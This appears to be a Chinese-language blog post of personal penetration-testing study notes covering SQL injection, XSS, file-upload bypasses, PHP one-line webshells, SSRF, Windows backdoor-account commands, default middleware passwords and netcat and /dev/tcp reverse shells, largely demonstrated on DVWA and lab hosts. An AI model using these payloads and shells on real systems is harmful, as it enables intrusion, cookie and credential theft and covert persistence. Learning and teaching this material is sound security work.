@@ -1,0 +1,560 @@
+#+BEGIN_HTML
+---
+layout: post
+title: 网络安全笔记
+description: 网络安全学习笔记。
+excerpt: ""
+categories: 安全
+tags: [Shell,Dos,PHP,Mysql]
+---
+#+END_HTML
+
+* 网络攻防基本介绍
+** 渗透测试分类
+*** 黑盒测试
+黑盒测试也称为功能测试，它是通过测试来监测每个功能是否都能够正常使用，在测试中，将程序看作
+一个不能够打开的盒子，在完全不考虑程序内部结构和内部特性的情况下，在程序接口进行测试，它只
+检查程序是否按照需求规格说明的规定正常使用，程序是否能够适当的接受输入数据而产生正确的数输
+出信息。黑盒测试着眼于程序外部结构，不考虑内部结构，主要针对软件界面和软件功能进行测试。
+*** 白盒测试
+白盒测试称为结构测试或逻辑驱动测试，是一种测试用例使用方法，它从程序的控制结构导出测试用例。
+*** 灰盒测试
+灰盒测试是介于黑盒测试和白盒测试中间的一种测试，测试多用于集成测试阶段，不仅关注输入与输出
+的正确性，同时也关注程序的内部情况。
+* 渗透测试
+** 术语
+: 扫描 
+: 木马、病毒 
+: 黑帽子、白帽子 
+: 社会工程学 
+: 钓鱼
+: poc、exploit
+: WebShell
+: DDoS
+: ARP攻击
+: 0day
+** 常见攻击
+: web:xss,csrf,提权逻辑错误
+: DB:sql注入,漏洞利用
+: 系统层:DDOS,远程溢出(MS08-067,MS10-020),rootkit,0day
+: 网络层:DDOS,ARP欺骗
+** 流程
+: 信息收集->扫描探测->漏洞利用->通道控制->内网扩展->资料回传
+** HTTP协议抓包工具
+: Burp Suite
+* Burp Suite使用
+** Target
+** Proxy
+代理，正对目标主机进行数据转发及数据包抓取。
+** Spider
+爬虫，爬取网站信息。
+** Scaner
+漏洞扫描，查看网站中常见的可利用漏洞。
+** Intruder
+暴力破解流程:
+: 1.打开数据包数据代理,在浏览器中打开网站登录界面,在Target中获取登录页面,发送至暴力模块.
+: 2.在暴力模块中positions中清除所有标记,然后选择自己感兴趣的变量.
+: 3.然后在暴力模块中选择payloads中选择所标记的变量及匹配方式.
+: 4.导入准备好的字典文件,然后点击Start attack按钮进行暴力破解.
+* HTTP协议
+** http协议请求类型
+: GET：请求指定页面内信息，返回实体主体
+: POST：请求服务器所接受指定的文档作为对所标识的URl的新的从属实体
+: PUT：从客户端向服务器传送的数据取代指定的文档的内容
+: DELETE：请求服务器删除指定的内容
+: HEAD：只请求页面的首部
+: OPTIONS：允许客户端查看服务器的性能
+** http状态码
+: 1xx-提供信息
+: 2xx-请求被成功提交
+: 3xx-客户端被重定向到其它资源
+: 4xx-请求错误
+: 5xx-服务器错误
+
+* DVWA暴力破解
+** 暴力破解定义
+*** 常见分类
+: 1.本地程序类 本地游戏等(IDA、Uedit32、ollydbg反汇编)
+: 2.远程服务类 OA系统等(利用密码字典,穷举法猜出用户口令)
+: 3.MD5等加密串暴力破解
+*** 暴力破解DVWA
+在使用burp suite时可以根据http状态码,长度及返回信息中的关键字信息来确认是否暴力破解成功,然
+后使用匹配成功的帐号去登录系统.
+*** 万能密码
+*** sql注入破解密码
+
+* SQL注入
+** mysql修改密码
+: mysqladmin -u root -p password "123456"; //在操作系统中
+: update user set password=password("123456") where user='root'; //在数据库中
+: update user set authentication_string=password("123456") where user='root'; //在5.7及以上的版中使用
+:
+: 如果忘记密码时，则可以跳过权限检查，然后在执行上面mysql中的命令
+: service mysql stop
+: mysql_safe --skip-grant-table &
+: 执行修改后，重启服务即可
+** sql注入类型
+: 按照提交方式 get post cookice
+: 按照数据库类型：php+mysql asp+access jsp+oracle
+: sql注入分为显注和盲注
+: 联合注入 //
+: 报错注入 //http://192.168.1.117/index2.php?name=admin'and (updatexml(1,concat(0x5e24,(select user()),0x5e24),1)) and '
+: 整型参数，字符，字符须注意单引号闭合
+** 注入方式
+: 手动注入
+: 利用sqlmap工具
+** sqlmap常用命令
+: sqlmap -u url --dbs //爆数据库
+: sqlmap -u url --current-user //爆当前用户
+: sqlmap -u url --user //查看用户权限
+: sqlmap -u url --tables -D 数据库 //爆表段
+: sqlmap -u url --columns -T 表段 -D 数据库 //爆字段
+: sqlmap -u url --dump -C 字段 -T 表段 -D 数据库 //猜解
+** 手动注入以DVWA为例
+: order by: 表序列
+: union select: 联合查询
+: 猜测当前数据库中表的个数：1' order by 3 # //当数目超过表个数之后数据库会返回错误信息
+: 1' union select 1,version() # //查询数据库版本
+: 1' union select 1,database() # //查询数据库名称
+: 1' union select 1,user()# //查询用户
+: 1' union select 1,password from users # //查询数据库中所有用户密码
+: 1' union select user,password from users # //查询数据库中所有用户及密码，如下图
+
+[[file:{{site.url}}/assets/images/security/sqlinjection.png]]
+** SQLserver开启xp_cmdshell功能
+首先，需要上传简单木马，可以通过菜刀连接到服务器，获取网站的配置文件中关于数据库帐号信息，
+然后配置菜刀中数据库的相关参数，再执行如下命令之后就可以开启服务器中的shell功能，我们可以
+尝试执行一些系统的命令。
+: EXEC sp_configure 'show advanced options',1 RECONFIGURE  //打开数据库高级功能
+: EXEC sp_configure 'xp_cmdshell',1 RECONFIGURE //打开xp_cmdshell功能
+: exec master..xp_cmdshell "whoami" //执行命令
+** mysql数据库结构
+: information_schema
+: mysql 用户 权限等运行所需信息 mysql.user
+: load_file
+: load_data
+: secure_file_priv 5开始需设定这个值并且有高权限，file权限，读写绝对路径文件。
+: select [content] into file/dumpfile [path] //file会做特殊字符转移，dumpfile不会做转移
+* 文件包含
+** php中常用四个文件包含函数
+: include()
+: include_once()
+: require()
+: require_once()
+包含类型分为本地包含和远程包含
+: 本地包含：http://192.168.1.103/www/vulnerabilities/fi/?page=02.php
+: 远程包含：http://192.168.1.103/www/vulnerabilities/fi/?page=http://192.168.1.103/php.ini
+** php伪协议
+: php://filter //例如：http://45.76.206.86:10000/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=file1.php
+: php://input
+: Zip://
+: Phar://
+: Rar://
+* XSS漏洞攻击
+** xss反射型
+手动测试
+: <script>alert(1)</script> //反弹信息
+: "><script>alert(/xss/)</script>
+: "onclick="alert(/xss/)</script>
+** 同源策略
+: 同协议 http https
+: 同域名
+: 同协议
+: X-Frame-Option DENY //不允许嵌入iframe标签
+** xss存储型攻击
+存储在数据库中，当页面每次加载数据库中的信息时，将之前插入数据库中的javascript语句进行执行
+并展示给用户。
+首先找一个有xss漏洞的网站，在XSS平台上注册一个帐号，生成一个攻击模板，然后使用这个模板的短
+网址复制到输入框中，将这个连接提交存储到数据库中，成功之后，用户每次访问数据库中的这条数据
+时，就会将用户的cookie信息上传到服务器中，这样我们使用上传的地址及cookie信息登录到系统中。
+
+#+CAPTION: 在xss平台生成模板得到短地址
+[[file:{{site.url}}/assets/images/security/shorturl.png]]
+
+#+CAPTION: 查看获取的信息
+[[file:{{site.url}}/assets/images/security/getinfo.png]]
+
+#+CAPTION: 使用老兵进行系统登录
+[[file:{{site.url}}/assets/images/security/laobin.png]]
+
+当自己有服务器时，我们可以在自己的服务器上放一个攻击脚本及信息收集脚本，然后，在其它有xss
+漏洞的网站上上传我们的服务器脚本连接至数据库中，这样当正常用户访问页面时，加载我们的连接脚
+本后，可以将用户的cookie及浏览url等信息上传至我们的服务器中，我们可以根据此信息，在浏览器
+中使用插件，将自身的cookie修改问其他正常用户的cookie信息，这样我们就可以达到，使用他人信息
+登录网站的目地。
+
+** DOM型xss攻击
+: \\x3Cscript\\x3Ealert(document.domain)\\x3CScript\\x3E
+: \\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
+** php防御
+: htmlentities($input) //输出原有字符，不出现弹窗
+:
+: <?php
+: $input=$_GET['input'];
+: echo $input; //直接输入alert即可
+:
+: <?php
+: $input=$_GET['input'];
+: echo htmlentities($input); //无法注入
+:
+: <?php$input=$_GET['input'];
+: echo '< img src='.htmlentities($input).'>';  //input=123 onclick=alert(123)
+:
+: <?php$input=$_GET['input'];
+: $input=str_replace('=','',$input);
+: echo '< img src='.$input.'>'; //?input=w><script>alert(123)</script>
+:
+: <?php
+: $input=$_GET['input'];
+: //$input=str_replace(' ','',$input);
+: $input=str_replace('=','',$input);
+: echo '< img src='.htmlentities($input).'>'; //无法注入
+:
+: DOM型XSS
+: <?php
+: $input=$_GET['input'];
+: $input=str_replace('=','',$input);
+: echo '<script>var a="'.htmlentities($input).'";document.write(a);</script>';
+: //?input=\x3Cscript\x3Ealert(1234565)\x3C/script\x3E可以绕过防御
+* 文件上传漏洞攻击
+** 文件上传JS验证
+1、在点击上传文件之前，首先F12打开源代码文件，将上传按钮中关于上传文件格式检查的函数取消，
+这样可以绕过文件类检查，将目标文件上传至网站中。
+
+#+CAPTION: 取消文件名称检查
+[[file:{{site.url}}/assets/images/security/cancelcheck.png]]
+
+2、将可利用的代码写至图片文件中，依然使用图片文件后缀名文件进行上传文件，在点击上传的同时
+开启burp suite进行数据抓包操作，将抓到的数据包中将文件名的后缀改成php等服务器可以识别的文
+件名，这样就可以使用菜刀等软件实现攻击网站的目地。
+
+#+CAPTION: 使用ubrp suite进行文件名称修改
+[[file:{{site.url}}/assets/images/security/modname.png]]
+
+3、将可利用代码写至图片中的方法
+: cat caidao.php >> caidao.jpg //Windows
+: copy /b caidao.php+caidao.jpg caidao.jpg //Linux
+
+** 文件上传MIME验证
+修改数据包中Content-Type的值，修改为网站允许的类型后就可以上传文件，对应php中$_file[]的值。
+
+#+CAPTION: 修改Content-Type值
+[[file:{{site.url}}/assets/images/security/uploadmime.png]]
+
+** 服务端扩展名验证
+1、将后缀名进行大小写更改进行尝试
+2、将后缀名添加其它字符进行上传尝试，如:file.php1
+3、白名单无法绕过，Php phtml php3 php5 php7
+4、黑名单，php phtml php5 (.user.ini .htaccess配置文件，改变服务器对文件解析方式，任意文件
+包含，更改后实时生效）auto_append_file包含在文件头部，auto_prepend_file包含在文件结尾
+5、将文件后缀名称之后添加"点空格[. ]"这样可以绕使用windows文件系统特性绕过安全检查
+** 文件内容更改
+在文件名称及文件类型正常的情况下，我们可以更改文件中的内容从而绕过服务器对上传文件的验证。
+将脚本文件中内容追加到图片中，服务器在验证图片信息时仅仅查看文件的头部信息，对其后面的数据
+信息并不进行判断，应此我们可以使用此方法将可执行代码上传至服务器。
+
+#+CAPTION: 更改文件中内容
+[[file:{{site.url}}/assets/images/security/uploadneirong.png]] 
+
+* CSRF攻击
+根据用户修改页面的源码生成一个csrf脚本，当用户点击这个新生成的脚本时，就可以在数据库中更改
+密码。
+
+#+CAPTION: csrf攻击脚本
+[[file:{{site.url}}/assets/images/security/csrf.png]]
+
+* SSRF
+** php
+: url_init()
+: http:://[address]
+: file://[127.0.0.1]/etc/passwd
+: gopher://   --redis 未授权访问
+: dict://127.0.0.1:22  探测端口号
+: parse_url:使用file绕过parse_url
+* 攻防
+一、防护
+1、修改已知帐号密码，数据库，windows管理员密码
+2、尽快发现自己的一些漏洞、木马、备份文件，系统安装文件、危险端口如445
+3、实时关注常用服务日志
+二、攻击
+1、扫描端口、寻找敏感端口，nmap、御剑2014
+2、扫描网站目录，使用御剑
+3、爆破常用服务(21,22,3389.3306,1433)
+* php相关
+** 回调函数
+: call_user_function('system','ls')
+: system exec shell_exec passthru popen pcntl_exec
+** php脚本函数执行
+: <?php  
+: $a='a';
+: $b='b';
+: $c="$a+${$b}";
+: $e=phpinfo();
+: $h=system('cat /etc/shadow');
+: $f="${${system('ls /tmp')}}"
+: $d="${${phpinfo()}}";
+: echo $c;
+: ?>
+** 一句话木马
+: assert($_GET[pass]); //?pass=system('ls')
+: $_GET[a](S_GET[b]); //?a=assert&b=phpinfo() ?a=system&b=ls
+: $s=$_GET['a']; eval("\a = \"$a\";");
+: call_user_function($_GET[a],$_GET[b]); 回调函数
+* JAVA
+** 备份
+: 备份源码、数据库
+** 修改口令
+: 系统密码
+** 扫描服务
+: netstat -ano ps -aux nmap -p- x.x.x.x
+** 加固
+: web:
+: cms 后台管理修改路径,更改为一个不可攻击的页面
+** struts2
+: 057
+: 052
+* Docker使用
+** docker基本命令
+: docker pull ubuntu 下载镜像
+: docker run --name host_name -itd -p 0.0.0.0:80:80 -v /var/www/thml:/root ubuntu bash 创建容器
+: docker ps 查看运行中的容器
+: docker ps -a 查看所有容器
+: docker start/stop/restart [container] 启动/停止/重启
+: docker rm -f 删除容器(-f运行中容器)
+: docker rmi 删除镜像
+: docker save -o test.tar test 打包镜像
+: docker load < test.tar 导入镜像
+** docker给运行中的容器添加映射端口
+1、将容器的8000端口映射到dokcer主机的8001端口
+: docker inspect webapp | grep IPAddress
+: iptables -t nat -A DOCKER -p tcp --dport 8001 -j DNAT --to-destination x.x.x.x:8000
+2、方法2
+: docker commit containerid foo/live 提交一个运行中的容器为镜像
+: docker run -d -p 8000:80 foo/live /bin/bash 运行镜像并添加端口
+** Docker remote api
+docker remote api是一个取代远程命令行界面的Rest api。启动docker remote api方式如下:
+: dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:5678
+执行开机启动
+: #vi /etc/sysconfig/docker
+: other_args = " -H unix:///var/run/docker.sock -H tcp://0.0.0.0:5678"
+: #service docker restart
+docker验证配置
+: #docker -H localhost:5678 version
+** Dcos
+dcos自动部署docker软件。
+* Mysql使用
+** mysql常用命令
+: show databases; 查看数据库
+: show tables; 查看数据库中表
+: use database_name; 选择数据库
+: select user(); 查看当前用户信息
+: select database(); 查看当前数据库
+: select schema(); 查看当前数据库
+: select user,host,password from mysql.user; 查询信息
+: update user set password=password('12') where user='jsf'; 更改密码
+: flush privileges; 刷新-更改系统配置之后
+: desc table_name;查看表结构
+: select 查询
+: update 更新
+: insert into 插入数据
+: delete 删除某条数据
+: drop 删除表 删除数据库
+: create 新建表 新建数据库
+: alter 更改表
+: grant 设置用户权限或新建用户 （需要更新权限 flush privileges）
+: create database test; 穿件数据库
+: grant all privileges on weixin.* to jsf1@'%' identified by '123456'; 创建用户及授权
+: grant select on dvwa.* to 'test'@'localhost' identified by 'test'; 分配dvwa数据库查询权限给test用户
+: show variables; 查看系统变量
+** sql注入
+1、空格绕过
+: %0a %0b %a0 %09
+: ()
+: `
+: +select+user+from`information_schema`.`schmata`where mysql特殊字符后面可以跟关键字
+2、php过滤单引号双引号
+: $id=mysql_real_escape_string($id)
+: 在sql语句中必须对变量使用引号，否则此过滤失效。
+* 在信息安全中常用工具
+** wireshark使用
+1、wireshark数据包及关键字查询
+: http.request.method==POST && http contains sgctf
+: http.request.method==POST && http contains ctf
+: http.request.method==POST && http contains flag
+: http.request.method==GET && http contains sgctf
+: http.request.method==GET && http contains ctf
+: http.request.method==GET && http contains flag
+** 查看文件的md5值
+1、linux系统下
+: md5sum file_name
+2、windows系统下
+: certutil -hashfile filename MD5
+: certutil -hashfile filename SHA1
+: certutil -hashfile filename SHA256
+** http流量
+在http流量收集及攻击中我们会用到很多有用的工具如：Burp Suite、arpspoof、driftnet、sslstrip
+等。
+: arpspoof:可以用来在局域网中进行arp攻击
+: driftnet:获取数据包中的图片，同时也支持抓取音频文件
+*** http PUT方法
+采用put方法可以上传非法文件及修改文件名称。
+: 补丁更新
+: 服务关闭(webDAV)
+** 操作系统
+1、在操作系统方面常用的工具有:nmap、tcpdump、wireshark、zmap、ettercap、metasploit等。
+nmap使用(Winpcap)：
+: nmap -sn ip 开机状态
+: nmap -sP ip 通过Ping测试
+: nmap -Pn ip 监测全部端口
+: nmap -P0 ip 直接进行扫描
+: nmap -sN ip 执行tcp空扫描欺骗防火墙
+: nmap -p ip 指定端口，多个之间使用逗号隔开
+: nmap -O ip 识别远程操作系统
+2、命令行注入利用到的字符串
+: "&" and "&&"
+: may be "|" or "||"
+** 数据库
+数据库安全性测试过程中常用工具有sqlmap等
+** 文件分析软件
+对于非文本文件(jpg)的查看不能使用常用的文本编辑器，而是需要特殊的软件去分析文件中所隐含的
+信息，如使用hexdump、od我们可以查看到一些有用的信息。
+* 常用中间件管理地址及默认帐号及漏洞利用
+以下服务中可以通过默认帐号或者直接上传，我们已经制作好的后门war文件。
+** windows常用命令
+: net user add likaikai 123456 /add //添加用户
+: net localgroup administrators likaikai /add  //添加到管理员组
+: query user //查询在线用户
+: logoff id //剔除在线用户，可以登录远程桌面
+: REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f //CMD开启查看3389端口 免重启 开启3389
+: start \\192.168.1.136\c$\Windows\ //当攻防时，为防止对方发现自己使用远程登录系统，则可以使用这个命令来访问对方文件
+** Weblogic
+: url: http://localhost:7001/console
+: username: weblogic
+: password: weblogic123
+** Tomcat
+: tomcat path:/usr/local/tomcat
+: url: http://localhost:8080
+: username: admin
+: password: 123
+: 在极端情况下可以删除manager目录，从而web管理界面无法打开，需要重启服务
+:
+: CVE-2017-12615 tomcat 8.5.19 put 漏洞，由conf/web.xml->readonly引起，设置为True即可解决问题
+: burp中put文件，PUT /jsf.jsp/ HTTP/1.1然后写上文件内容即可。
+** Jboos
+: url: http://localhost:8080
+** IIS漏洞使用
+在上传文件中，在文件名称中添加asp/file.jpg后，就可以以php的方式去运行这个jpg文件，这样我们
+就可以上传后门代码值服务器。
+* 日志分析
+查看分析常见操作系统及中间件日志文件，apache日志、IP、时间、请求资源及方式、http状态码，
+tomcat等软件。
+* 工具使用实验
+** nc软件使用
+1、Windows nc反弹cmdshell
+: nc -lvp 8080 //本地执行
+: nc -e cmd.exe dest_ip 8080 //服务器执行
+2、Linux nc反弹shell
+: nc -lvp 8080 //本地执行
+: /bin/bash -i >& /dev/tcp/dest_ip 8080 0>&1 //服务器执行
+** 通过mysql服务向web目录读写文件
+通过暴力破解获取远程mysql服务器登录权限，在数据库权限足够高的情况下可以读写网站的相关文件。
+: select 'test string' into outfile 'C:\www\jsf.php';
+: select load_file('C:\www\jsf.php');
+** IIS put漏洞使用
+我们可以使用工具去扫描网站是否支持http put方法，如果检测发现能够使用put方法，我们就可以针
+对服务器进行进一步的攻击，我们可以上传恶意文件，然后可以进行修改文件信息等的操作。首先如图，
+我们针对目标服务器进行扫描。
+
+#+CAPTION: 进行服务器put扫描
+[[file:{{site.url}}/assets/images/security/putscanner.png]]
+
+扫描到可以使用的put服务器之后，我们进一步针对某个页面查看，这个页面支持那些http方法，如图
+
+#+CAPTION: 查看页面option
+[[file:{{site.url}}/assets/images/security/httpoption.png]]
+
+
+然后，在本地准备一个名称jsfput.txt的文本文件，其中文件的内容为：
+
+#+CAPTION: 服务器上传脚本文件内容
+[[file:{{site.url}}/assets/images/security/aspscript.png]]
+
+接着在工具中我们选择使用put方法，将本地制作好的文件上传到服务器中，如图
+
+#+CAPTION: put文件至服务器
+[[file:{{site.url}}/assets/images/security/putfile.png]]
+
+再使用move方法，将我们已经上传至服务器中的文件进行文件名称更改
+
+#+CAPTION: 脚本文件名称修改
+[[file:{{site.url}}/assets/images/security/filemove.png]]
+
+名称修改成功之后，我们可以在菜刀软件中可以添加服务器中的脚本文件路径，并且在密码输入框中输
+入我们在脚本文件中定义好的密码字符，在下面选择相应的服务器执行语言后，点击添加，最后我们右
+键新输入的条目，就可以选择相应的功能。如文件浏览，虚拟终端等。
+
+#+CAPTION: 将已攻击的网站信息添加到菜刀软件中
+[[file:{{site.url}}/assets/images/security/caidao.png]]
+
+#+CAPTION: 浏览网站文件
+[[file:{{site.url}}/assets/images/security/caidaofile.png]]
+
+
+** Metasploit 渗透Windos7
+使用metasploit可以方便的进行渗透实验，我们可以在kaililinux操作系统中使用已经安装好的工具
+metasploit来对某些主机进行渗透实验，在本实验中我们选择一台主机作为被攻击对象，首先使用工具
+nmap来查看目标主机开发了那些服务，然后我们就可以针对开启的服务进行选择性的攻击。
+
+#+CAPTION: 扫描端口
+[[file:{{site.url}}/assets/images/security/nmap.png]]
+
+我们可以从中发现在目标主机中开启了445端口，然后我们可以针对这个漏洞做一些操作，按照下面的
+步骤我们就可以进入远程主机。
+
+#+ATTR_HTML: :width 85%
+#+CAPTION: 设置
+[[file:{{site.url}}/assets/images/security/use.png]]
+
+#+CAPTION: 设置远程主机
+[[file:{{site.url}}/assets/images/security/setRhost.png]]
+
+#+ATTR_HTML: :width 85%
+#+CAPTION: 开始进行渗透
+[[file:{{site.url}}/assets/images/security/exploit.png]]
+
+经过上面的操作我们可以看到kalilinux已经和目标主机之间建立了通行，接下来我们就可以查看目标
+主机的信息并且获取目标主机shell权限来执行一些脚本。
+
+#+CAPTION: 查看系统信息
+[[file:{{site.url}}/assets/images/security/sysinfo.png]]
+
+#+CAPTION: 执行脚本
+[[file:{{site.url}}/assets/images/security/script.png]]
+** .cgi为文件后缀名漏洞使用
+如果发现网站上有.cgi为后缀名称的文件时，我们可以尝试使用反弹shell利用，在本机执行如下两条
+命令之后，我们就有可能获取到服务器的shell权限。
+
+#+CAPTION: 打开本地监听端口
+[[file:{{site.url}}/assets/images/security/ncshell.png]]
+
+#+ATTR_HTML: :width 85%
+#+CAPTION: 漏洞利用远程主机连接至本地监听
+[[file:{{site.url}}/assets/images/security/cgishell.png]]
+** jboss java反序列化工具使用
+当我们发现在服务器上使用了jboss软件服务时，我们就可以尝试使用这个工具去尝试对网站进行一些
+信息的收集、命令执行及webshell上传等操作。
+
+#+CAPTION: jboss java反序列化软件使用
+
+[[file:{{site.url}}/assets/images/security/jbossjava.png]]
+
+
+
+#+BEGIN_HTML
+<!-- more-forword -->
+#+END_HTML
+
+
+#+BEGIN_HTML
+<!-- more -->
+#+END_HTML
